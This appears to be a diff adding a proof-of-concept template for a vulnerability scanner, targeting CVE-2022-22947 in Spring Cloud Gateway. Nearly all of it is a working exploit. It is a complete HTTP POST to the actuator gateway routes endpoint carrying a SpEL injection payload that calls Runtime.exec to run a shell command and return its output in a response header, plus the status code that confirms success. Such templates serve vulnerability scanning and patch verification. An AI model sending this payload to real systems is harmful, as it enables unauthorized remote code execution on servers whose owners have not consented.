@@ -1,0 +1,19 @@
+﻿<DudePoc_Name>CVE_2022_22947</DudePoc_Name>
+<DudePoc_Description></DudePoc_Description>
+<DudePoc_SetHeader>
+POST /actuator/gateway/routes/8Fn3ivs HTTP/1.1
+Host: $<AttackHost>$
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+Connection: close
+Content-Type: application/json
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+{"id": "8Fn3ivs", "filters": [{"name": "AddResponseHeader", "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}], "uri": "http://example.com"}
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>201</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData></DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
